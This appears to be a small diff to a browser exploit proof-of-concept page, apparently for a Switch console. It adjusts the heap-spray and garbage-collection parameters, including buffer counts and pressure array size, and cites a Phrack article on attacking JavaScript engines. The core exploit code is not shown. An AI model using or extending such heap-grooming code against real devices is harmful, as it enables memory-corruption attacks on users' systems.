@@ -9,7 +9,7 @@
         </style>
     </head>
     <body>
-        <h1>Switch buffer test poc1 test4</h1>
+        <h1>Switch buffer test poc1 test5</h1>
         <ul>
             <li><a href='javascript:go();'>go!</a></li>
             <li><a href='javascript:document.location.reload();'>reload</a></li>
@@ -32,9 +32,9 @@
                 // saelo's phrack article is invaluable: http://www.phrack.org/papers/attacking_javascript_engines.html
                 var killMe = 70;
                 // garbage collection stuff
-                var pressure = new Array(500);
+                var pressure = new Array(100);
                 var rwbuf = new ArrayBuffer(0x1003 * 4);
-                var numbufs = 40000;
+                var numbufs = 20000;
                 var bufs = new Array(numbufs);
                 // do garbage collect
                 dgc = function() {
